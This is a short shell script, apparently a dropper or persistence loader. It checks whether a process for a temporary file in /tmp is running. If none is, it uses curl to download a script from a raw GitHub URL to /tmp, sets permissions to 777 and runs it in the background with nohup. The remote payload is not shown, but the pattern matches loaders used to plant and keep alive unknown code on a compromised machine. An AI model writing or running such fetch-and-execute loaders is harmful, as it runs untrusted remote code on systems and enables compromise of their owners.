#!/bin/sh

FILE_NAME="/tmp/asdfasdf44.sh"
  
procNum=`ps -ef | grep "$FILE_NAME" | grep -v grep | wc -l`

echo $procNum

if [ $procNum -eq 0 ]; then

/bin/curl https://raw.githubusercontent.com/wulimama001/test/master/test.sh -o $FILE_NAME


chmod 777 $FILE_NAME

/usr/bin/nohup  /bin/bash $FILE_NAME > "$FILE_NAME.log" 2>&1 &

fi
